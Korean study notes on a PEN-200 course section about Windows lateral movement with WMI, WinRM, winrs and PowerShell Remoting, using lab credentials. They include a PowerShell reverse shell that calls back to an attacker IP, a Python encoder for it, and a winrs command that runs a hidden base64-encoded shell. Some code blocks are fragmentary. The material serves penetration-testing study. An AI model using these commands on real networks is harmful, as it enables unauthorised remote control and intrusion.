# 24.1.1 WMI와 WinRM

> **WMI and WinRM** · PEN-200 §24.1.1

**WMI**

WMI(Windows Management Instrumentation)는 작업 자동화를 위한 객체 지향 기능이고, `Win32_Process` 클래스의 `Create` 메서드로 **프로세스를 생성**할 수 있음. 이것이 측면 이동의 통로가 됨.

- 원격 접근은 RPC over **포트 135**, 세션 데이터는 **고범위 포트(19152–65535)** 사용
  > ⚠️ **교재 오류** — 교재는 `19152-65535` 로 적으나 Windows 동적 포트 대역은 `49152-65535` 임.
- 전제 조건은 대상 머신의 **로컬 Administrators 그룹 소속 자격 증명**. 도메인 사용자여도 됨
- 도메인 미가입 머신에서 걸리던 **UAC 원격 제한은 도메인 사용자에게 적용되지 않음** — 즉 도메인 계정으로 움직이면 전체 권한을 그대로 씀

⚠️ WMI Provider Host 는 시스템 서비스여서, WMI 로 만든 프로세스는 **session 0** 에 뜸(Windows Vista 부터의 세션 격리). 대화형 데스크톱에 창이 뜨지는 않고, 대상에 로그인해 있다면 작업 관리자의 프로세스 목록에서 해당 사용자로 도는 것을 확인할 수 있음.

`wmic` 유틸리티가 고전적인 방식임(현재는 deprecated). `/node:` 에 대상 IP, `/user:`·`/password:` 에 자격 증명, 뒤에 `process call create` 로 실행할 것을 지정함.

```
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call
create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5772;
        ReturnValue = 0;
};
```

**성공 판정은 `ReturnValue = 0`** 과 새 PID 임.

**PowerShell 로 같은 일 하기**

`wmic` 가 사라지고 있으므로 PowerShell 구현을 익혀둘 것. 세 단계임.

**① 자격 증명 객체** — 비밀번호를 `ConvertTo-SecureString` 으로 감싸 `PSCredential` 을 만듦.

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,
$secureString;
```

**② CIM 세션** — 프로토콜을 DCOM 으로 지정하고 대상·자격 증명을 묶어 세션을 엶.

```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -
SessionOption $Options
$command = 'calc';
```

**③ 메서드 호출** — `Win32_Process`/`Create` 조합에 인자를 `@{CommandLine =$Command}` 로 감싸 넘김.

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -
Arguments @{CommandLine =$Command};
```

CLIENT74 에 jeff 로 접속해 위 세 조각을 차례로 붙여 넣은 결과임. `ReturnValue` 0 과 PID 가 돌아오면 원격 프로세스 생성이 성공한 것임.

```

...

```

**페이로드를 리버스셸로 바꾸기**

`calc` 자리에 리버스셸을 넣으면 실제 측면 이동이 됨. 다만 PowerShell 리버스셸에는 특수문자가 많아 그대로 넣으면 이스케이프 지옥이 되므로 **base64 로 인코딩해 `-e` 로 전달**함. 아래 Python 스크립트가 페이로드를 UTF-16LE 로 인코딩해 완성된 명령줄을 출력함 — IP 와 포트를 자신의 Kali 것으로 바꿔 쓸 것.

```python

System.Net.Sockets.TCPClient("192.168.118.2",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'

base64.b64encode(payload.encode('utf16')[2:]).decode()

```

**WinRM · WinRS**

WinRM 은 Microsoft 의 WS-Management 구현으로, HTTP/HTTPS 위로 XML 메시지를 주고받음. **암호화된 HTTPS 는 TCP 5986, 평문 HTTP 는 5985.**

- PowerShell 구현 외에 내장 유틸리티 여럿이 WinRM 을 쓰며, 그중 하나가 `winrs`(Windows Remote Shell) 임
- **`winrs` 의 전제 조건**은 도메인 사용자가 대상 호스트의 **Administrators 또는 Remote Management Users** 그룹에 속하는 것 — 로컬 Administrators 만 허용하는 WMI 보다 문턱이 하나 낮음. 다만 `winrs` 는 도메인 사용자에게만 동작함
- 인자는 `-r:` 대상, `-u:` 사용자, `-p` 비밀번호, 마지막에 실행할 명령

```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```

여기서도 마지막 인자를 앞서 만든 base64 리버스셸로 갈아끼우면 그대로 셸이 됨.

```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF

HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

PowerShell 쪽 구현은 **PowerShell Remoting** 임. `New-PSSession` 으로 세션을 만들고, 반환된 세션 ID 를 `Enter-PSSession` 에 넘겨 들어감.

```powershell

PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -
Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential
$username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 Id Name            ComputerName    ComputerType    State         ConfigurationName
Availability

------------

```

```
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
```

이 경로는 리버스셸을 따로 받지 않고 **대상 호스트의 세션에 직접 들어가는** 형태임.
